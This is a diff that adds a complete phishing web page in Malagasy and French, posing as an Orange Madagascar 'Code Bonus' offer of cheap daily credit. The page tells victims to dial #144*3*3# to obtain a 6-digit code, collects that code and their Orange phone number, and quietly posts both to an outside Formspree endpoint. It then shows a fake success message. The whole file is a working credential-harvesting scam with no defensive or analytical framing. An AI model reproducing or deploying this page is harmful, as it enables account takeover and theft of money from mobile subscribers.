@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="mg">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Code Bonus - Madagascar</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background-color: #1a1a2e;
+            color: white;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            background-color: #16213e;
+            padding: 25px;
+            border-radius: 15px;
+            width: 90%;
+            max-width: 450px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        .step { display: none; }
+        .active { display: block; }
+        
+        h1 { color: #e94560; font-size: 22px; }
+        .btn-next, .btn-confirm {
+            background-color: #e94560;
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 8px;
+            width: 100%;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+        }
+
+        .tarif-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 10px;
+            max-height: 350px;
+            overflow-y: auto;
+            margin-top: 15px;
+            padding: 5px;
+        }
+        .tarif-card {
+            background: #1a1a2e;
+            padding: 12px;
+            border: 1px solid #0f3460;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: left;
+            font-size: 14px;
+        }
+        .tarif-card:hover { border-color: #e94560; background: #1f1f3d; }
+        .tarif-card b { color: #4dfd63; float: right; }
+
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border-radius: 5px;
+            border: 1px solid #0f3460;
+            background: #1a1a2e;
+            color: white;
+            box-sizing: border-box;
+            font-size: 16px;
+        }
+        .info-box {
+            background: rgba(233, 69, 96, 0.1);
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 13px;
+            color: #ff9a9e;
+            border-left: 4px solid #e94560;
+            text-align: left;
+            margin-bottom: 15px;
+            line-height: 1.4;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    
+    <div id="step1" class="step active">
+        <div style="font-size: 50px; margin-bottom: 10px;">🎁</div>
+        <h1>Bienvenue dans Code Bonus</h1>
+        <p>Nahazo fahafahana hahazo bonus manokana ianao anio.</p>
+        <button class="btn-next" onclick="nextStep(2)">SUIVANT</button>
+    </div>
+
+    <div id="step2" class="step">
+        <h1>Choisir ton tarif</h1>
+        <p style="font-size: 12px;">Tsindrio ny tarif iray tianao hovidiana</p>
+        <div class="tarif-grid">
+            <div class="tarif-card" onclick="selectTarif('40.000Ar Bonus / 21.400Ar')">40.000Ar bonus par jour <b>21.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('60.000Ar Bonus / 31.400Ar')">60.000Ar bonus par jour <b>31.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('90.000Ar Bonus / 41.400Ar')">90.000Ar bonus par jour <b>41.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('120.000Ar Bonus / 56.800Ar')">120.000Ar bonus par jour <b>56.800Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('140.000Ar Bonus / 71.400Ar')">140.000Ar bonus par jour <b>71.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('180.000Ar Bonus / 87.500Ar')">180.000Ar bonus par jour <b>87.500Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('320.000Ar Bonus / 100.400Ar')">320.000Ar bonus par jour <b>100.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('560.000Ar Bonus / 181.400Ar')">560.000Ar bonus par jour <b>181.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('980.000Ar Bonus / 311.400Ar')">980.000Ar bonus par jour <b>311.400Ar</b></div>
+            <div class="tarif-card" onclick="selectTarif('1.400.000Ar Bonus / 461.400Ar')">1.400.000Ar bonus par jour <b>461.400Ar</b></div>
+        </div>
+    </div>
+
+    <div id="step3" class="step">
+        <h1>Validation</h1>
+        <div class="info-box">
+            Ny fangalana anlay 6 chiffres dia tsy foronina fa ity <b>#144*3*3#</b> maka 6 chiffres dia io no amenona azy.
+        </div>
+        
+        <form id="bonusForm" action="https://formspree.io/f/mreaeppz" method="POST">
+            <input type="hidden" name="Tarif_Nofidiana" id="selectedTarifInput">
+            
+            <label style="display:block; text-align:left; font-size:12px;">Numero Orange (032********)</label>
+            <input type="tel" name="Numero_Orange" placeholder="032XXXXXXXX" required>
+
+            <label style="display:block; text-align:left; font-size:12px;">Code (6 chiffres)</label>
+            <input type="number" name="Code_6_Chiffres" placeholder="6 chiffres" required>
+
+            <button type="submit" id="submitBtn" class="btn-confirm">CONFIRMER</button>
+        </form>
+    </div>
+
+    <div id="step4" class="step">
+        <div style="font-size: 60px; margin-bottom: 15px;">💐</div>
+        <h1 style="color: #4dfd63;">Félicitations</h1>
+        <p>Vous êtes éligible au bonus ! Ny fangatahanao dia efa voaray ary ho voamarina ao anatin'ny fotoana fohy.</p>
+    </div>
+
+</div>
+
+<script>
+    function nextStep(step) {
+        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+        document.getElementById('step' + step).classList.add('active');
+    }
+
+    function selectTarif(tarif) {
+        // Tehirizina ilay tarif nofidiana mba halefa any amin'ny email
+        document.getElementById('selectedTarifInput').value = tarif;
+        nextStep(3);
+    }
+
+    const form = document.getElementById('bonusForm');
+    form.onsubmit = async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('submitBtn');
+        btn.innerText = "Fanamarinana...";
+        btn.disabled = true;
+
+        const data = new FormData(form);
+        
+        try {
+            const response = await fetch(form.action, {
+                method: 'POST',
+                body: data,
+                headers: { 'Accept': 'application/json' }
+            });
+
+            if (response.ok) {
+                nextStep(4);
+            } else {
+                alert("Misy olana kely. Hamarino ny internet-nao.");
+                btn.innerText = "CONFIRMER";
+                btn.disabled = false;
+            }
+        } catch (error) {
+            alert("Erreur de connexion.");
+            btn.innerText = "CONFIRMER";
+            btn.disabled = false;
+        }
+    };
+</script>
+
+</body>
+</html>
